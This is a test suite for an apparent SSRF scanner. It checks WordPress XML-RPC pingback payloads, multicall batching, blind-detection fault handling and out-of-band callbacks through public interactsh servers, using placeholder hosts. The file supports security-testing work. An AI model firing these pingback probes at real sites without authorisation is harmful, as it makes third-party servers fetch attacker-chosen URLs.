import { test } from "node:test";
import assert from "node:assert";
import http from "node:http";
import { execFileSync } from "node:child_process";
import path from "node:path";
import {
  buildPingbackSingle,
  buildPingbackMulticall,
  buildListMethods,
  buildPingbackRequest,
  parseMethodList,
  hasPingbackMethod,
  interpretPingbackResponse,
  xmlrpcEndpoint,
  PINGBACK_METHOD,
  LIST_METHODS_METHOD,
  MAX_MULTICALL,
  XMLRPC_PATH,
  XMLRPC_CONTENT_TYPE,
} from "../core/engines/ssrf/payloads/xmlrpc.ts";
import {
  oobConfigFromEnv,
  PUBLIC_INTERACTSH_SERVER,
  PUBLIC_INTERACTSH_DOMAIN,
  PUBLIC_INTERACTSH_SERVERS,
  oobCandidates,
} from "../core/engines/ssrf/interactsh.ts";
import { executeSsrfPlan } from "../core/engines/ssrf/executor.ts";
import { NotificationManager } from "../core/engines/ssrf/canary.ts";
import { runSsrfScan } from "../cli/commands/ssrf/run.ts";
import { buildBlindPingbackRequest } from "../cli/commands/ssrf/blind.ts";

const SOURCE = "http://abc123.oast.test/c/abc123";
const TARGET_URI = "https://victim.test/hello-world/";

// --- payload builders -------------------------------------------------------

test("buildPingbackSingle — one pingback.ping methodCall with both URIs", () => {
  const body = buildPingbackSingle({ sourceUri: SOURCE, targetUri: TARGET_URI });
  assert.match(body, /^<\?xml version="1.0"\?>/);
  assert.ok(body.includes(`<methodName>${PINGBACK_METHOD}</methodName>`));
  assert.ok(body.includes(SOURCE), "body must contain source URI");
  assert.ok(body.includes(TARGET_URI), "body must contain target URI");
  assert.strictEqual((body.match(/<methodCall>/g) ?? []).length, 1);
  assert.strictEqual((body.match(/<param>/g) ?? []).length, 2);
});

test("buildPingbackMulticall — batches N pingback.ping entries", () => {
  const body = buildPingbackMulticall({ sourceUri: SOURCE, targetUri: TARGET_URI, count: 5 });
  assert.ok(body.includes("<methodName>system.multicall</methodName>"));
  assert.strictEqual((body.match(new RegExp(`<string>${PINGBACK_METHOD}</string>`, "g")) ?? []).length, 5);
  assert.strictEqual((body.match(new RegExp(SOURCE.replace(/[.*+?^${}()|[\]\\]/g, "\\$&"), "g")) ?? []).length, 5);
  assert.ok(body.includes(TARGET_URI));
  // One outer param wrapping an array of structs.
  assert.strictEqual((body.match(/<struct>/g) ?? []).length, 5);
});

test("buildPingbackMulticall — defaults to 1 and clamps to MAX_MULTICALL", () => {
  const one = buildPingbackMulticall({ sourceUri: SOURCE, targetUri: TARGET_URI });
  assert.strictEqual((one.match(/<struct>/g) ?? []).length, 1);

  const capped = buildPingbackMulticall({ sourceUri: SOURCE, targetUri: TARGET_URI, count: 500 });
  assert.strictEqual((capped.match(/<struct>/g) ?? []).length, MAX_MULTICALL);

  const zero = buildPingbackMulticall({ sourceUri: SOURCE, targetUri: TARGET_URI, count: 0 });
  assert.strictEqual((zero.match(/<struct>/g) ?? []).length, 1);
});

test("buildListMethods — system.listMethods methodCall", () => {
  const body = buildListMethods();
  assert.ok(body.includes(`<methodName>${LIST_METHODS_METHOD}</methodName>`));
  assert.ok(body.includes("<methodCall>"));
  assert.ok(!body.includes("<param>"));
});

test("pingback payload XML-escapes URI metacharacters", () => {
  const body = buildPingbackSingle({ sourceUri: "http://x/?a=1&b=2", targetUri: TARGET_URI });
  assert.ok(body.includes("a=1&amp;b=2"));
  assert.ok(!body.includes("a=1&b=2"));
});

test("parseMethodList / hasPingbackMethod — extracts <string> names", () => {
  const response = `<?xml version="1.0"?><methodResponse><params><param><value><array><data>
    <value><string>system.multicall</string></value>
    <value><string>system.listMethods</string></value>
    <value><string>pingback.ping</string></value>
    <value><string>wp.getPosts</string></value>
  </data></array></value></param></params></methodResponse>`;
  assert.deepStrictEqual(parseMethodList(response), [
    "system.multicall",
    "system.listMethods",
    "pingback.ping",
    "wp.getPosts",
  ]);
  assert.strictEqual(hasPingbackMethod(response), true);
  assert.strictEqual(hasPingbackMethod(buildListMethods()), false);
});

// --- fault interpreter ------------------------------------------------------

test("interpretPingbackResponse — fault 17 → fetched true (check OOB)", () => {
  const body = `<?xml version="1.0"?><methodResponse><fault><value><struct>
    <member><name>faultCode</name><value><int>17</int></value></member>
    <member><name>faultString</name><value><string>source URI does not exist</string></value></member>
  </struct></value></fault></methodResponse>`;
  const verdict = interpretPingbackResponse(body);
  assert.strictEqual(verdict.faultCode, 17);
  assert.strictEqual(verdict.fetched, true);
  assert.match(verdict.reason, /source URI/i);
});

test("interpretPingbackResponse — fault 33 → fetched false", () => {
  const body = `<methodResponse><fault><value><struct>
    <member><name>faultCode</name><value><int>33</int></value></member>
    <member><name>faultString</name><value><string>target is not a valid pingback target</string></value></member>
  </struct></value></fault></methodResponse>`;
  const verdict = interpretPingbackResponse(body);
  assert.strictEqual(verdict.faultCode, 33);
  assert.strictEqual(verdict.fetched, false);
});

test("interpretPingbackResponse — success struct → fetched true", () => {
  const body = `<methodResponse><params><param><value><struct>
    <member><name>msg</name><value><string>Pingback from http://abc.oast.test/c/abc to https://victim.test/post registered. Keep the web log on somewhere to keep track of it</string></value></member>
  </struct></value></param></params></methodResponse>`;
  const verdict = interpretPingbackResponse(body);
  assert.strictEqual(verdict.faultCode, null);
  assert.strictEqual(verdict.fetched, true);
});

test("interpretPingbackResponse — dispatch faults and malformed bodies never crash", () => {
  for (const code of [-32700, -32600, -32601]) {
    const verdict = interpretPingbackResponse(
      `<methodResponse><fault><value><struct><member><name>faultCode</name><value><int>${code}</int></value></member></struct></value></fault></methodResponse>`
    );
    assert.strictEqual(verdict.faultCode, code);
    assert.strictEqual(verdict.fetched, false);
  }
  for (const body of ["", "<html>not xml</html>", "<fault/>", "garbage"]) {
    const verdict = interpretPingbackResponse(body);
    assert.strictEqual(verdict.fetched, false);
    assert.strictEqual(typeof verdict.reason, "string");
  }
});

// --- oobConfigFromEnv public fallback --------------------------------------

test("oobConfigFromEnv — public servers are the default; INTERACTSH_PUBLIC=0 disables", () => {
  // Nothing configured → first public server (mirrors interactsh-client).
  assert.deepStrictEqual(oobConfigFromEnv({}), {
    server: PUBLIC_INTERACTSH_SERVER,
    domain: PUBLIC_INTERACTSH_DOMAIN,
  });
  // Explicit opt-out.
  for (const off of ["0", "false", "off", "no"]) {
    assert.strictEqual(oobConfigFromEnv({ INTERACTSH_PUBLIC: off }), null);
  }
  // Select a specific public server by domain or bare name.
  assert.deepStrictEqual(oobConfigFromEnv({ INTERACTSH_PUBLIC_SERVER: "oast.fun" }), {
    server: "https://oast.fun",
    domain: "oast.fun",
  });
  assert.deepStrictEqual(oobConfigFromEnv({ INTERACTSH_PUBLIC_SERVER: "oast.live" }), {
    server: "https://oast.live",
    domain: "oast.live",
  });
  // INTERACTSH_PUBLIC=1 is still accepted for back-compat.
  assert.deepStrictEqual(oobConfigFromEnv({ INTERACTSH_PUBLIC: "1" }), {
    server: PUBLIC_INTERACTSH_SERVER,
    domain: PUBLIC_INTERACTSH_DOMAIN,
  });
});

test("oobCandidates — rotation list, self-hosted collapses to one", () => {
  assert.strictEqual(oobCandidates({}).length, PUBLIC_INTERACTSH_SERVERS.length);
  assert.deepStrictEqual(oobCandidates({ INTERACTSH_PUBLIC: "0" }), []);
  assert.deepStrictEqual(
    oobCandidates({ INTERACTSH_SERVER: "https://oast.example", INTERACTSH_DOMAIN: "oast.example" }),
    [{ server: "https://oast.example", domain: "oast.example" }]
  );
});

test("oobConfigFromEnv — explicit server/domain wins over public flag", () => {
  assert.deepStrictEqual(
    oobConfigFromEnv({
      INTERACTSH_PUBLIC: "1",
      INTERACTSH_SERVER: "https://oast.example",
      INTERACTSH_DOMAIN: "oast.example",
    }),
    { server: "https://oast.example", domain: "oast.example" }
  );
});

// --- request shape / CLI wiring -------------------------------------------

test("buildPingbackRequest — POST /xmlrpc.php with text/xml body", () => {
  const request = buildPingbackRequest({
    targetUrl: "https://victim.test/blog/post",
    sourceUri: SOURCE,
    targetUri: TARGET_URI,
  });
  assert.strictEqual(request.method, "POST");
  assert.strictEqual(request.url, `https://victim.test${XMLRPC_PATH}`);
  assert.strictEqual(request.headers["Content-Type"], XMLRPC_CONTENT_TYPE);
  assert.ok(request.body.includes(PINGBACK_METHOD));
  assert.deepStrictEqual(xmlrpcEndpoint("https://victim.test/blog/post"), "https://victim.test/xmlrpc.php");
});

test("runSsrfScan --xmlrpc-pingback — returns POST plan, not a GET query param", () => {
  const plan = runSsrfScan("https://victim.test/blog/post", "url", {
    xmlrpcPingback: true,
    pingbackTargetUri: TARGET_URI,
    sourceUri: SOURCE,
    multicall: 3,
  });
  assert.strictEqual(plan.length, 1);
  const item = plan[0];
  assert.strictEqual(item.category, "xmlrpc pingback");
  assert.strictEqual(item.method, "POST");
  assert.strictEqual(item.requestUrl, "https://victim.test/xmlrpc.php");
  assert.strictEqual(item.headers?.["Content-Type"], "text/xml");
  assert.ok(item.body?.includes("system.multicall"));
  assert.ok(item.payload.includes(SOURCE));
  // Parameter-based behaviour is preserved when the flag is absent.
  const legacy = runSsrfScan("https://victim.test/blog/post", "url", { max: 1 });
  assert.ok(!legacy[0].requestUrl, "legacy plan items carry no fixed requestUrl");
  assert.notStrictEqual(legacy[0].method, "POST");
});

test("runSsrfScan --xmlrpc-pingback — target URI required", () => {
  assert.throws(
    () => runSsrfScan("https://victim.test/", "url", { xmlrpcPingback: true }),
    TypeError
  );
});

test("buildBlindPingbackRequest — POST to /xmlrpc.php with source from OOB", () => {
  const request = buildBlindPingbackRequest("https://victim.test/post", {
    targetUri: TARGET_URI,
    sourceUri: SOURCE,
  });
  assert.strictEqual(request.method, "POST");
  assert.strictEqual(request.url, "https://victim.test/xmlrpc.php");
  assert.ok(request.body.includes(SOURCE));
});

test("cli run --xmlrpc-pingback — POST /xmlrpc.php with text/xml, no GET parameter", () => {
  const scriptPath = path.resolve(import.meta.dirname, "../cli/commands/ssrf/index.ts");
  const output = execFileSync(
    process.execPath,
    [
      "--experimental-strip-types",
      scriptPath,
      "run",
      "https://victim.test/blog/post",
      "--xmlrpc-pingback",
      `--target-uri=${TARGET_URI}`,
    ],
    { encoding: "utf8" }
  );
  const line = output.trim().split("\n").find((l) => l.startsWith("["));
  assert.ok(line, "CLI must emit a JSON plan");
  const parsed = JSON.parse(line!);
  assert.strictEqual(parsed.length, 1);
  assert.strictEqual(parsed[0].method, "POST");
  assert.strictEqual(parsed[0].requestUrl, "https://victim.test/xmlrpc.php");
  assert.strictEqual(parsed[0].headers["Content-Type"], "text/xml");
  assert.ok(parsed[0].body.includes("pingback.ping"));
});

test("executor sends the pingback as a POST to /xmlrpc.php", async () => {
  const requests: Array<{ method?: string; url?: string; headers: http.IncomingHttpHeaders; body: string }> = [];
  const server = http.createServer((req, res) => {
    let body = "";
    req.on("data", (chunk) => { body += chunk; });
    req.on("end", () => {
      requests.push({ method: req.method, url: req.url, headers: req.headers, body });
      res.writeHead(200, { "content-type": "text/xml" });
      res.end("<methodResponse><params><param><value><struct><member><name>msg</name><value><string>Pingback from x to y registered.</string></value></member></struct></value></param></params></methodResponse>");
    });
  });
  await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
  const address = server.address();
  if (address === null || typeof address === "string") throw new Error("no port");
  try {
    const target = `http://127.0.0.1:${address.port}/blog/post?url=legacy`;
    const plan = runSsrfScan(target, "url", {
      xmlrpcPingback: true,
      pingbackTargetUri: TARGET_URI,
      sourceUri: SOURCE,
    });
    await executeSsrfPlan(target, "url", plan, {
      notifications: new NotificationManager(),
      timeoutMs: 2000,
    });
    assert.strictEqual(requests.length, 1);
    assert.strictEqual(requests[0].method, "POST");
    assert.strictEqual(requests[0].url, XMLRPC_PATH);
    assert.match(String(requests[0].headers["content-type"]), /text\/xml/);
    assert.ok(requests[0].body.includes("pingback.ping"));
    assert.ok(!requests[0].url!.includes("url="), "must not fall back to a query-parameter GET");
  } finally {
    await new Promise<void>((resolve) => server.close(() => resolve()));
  }
});
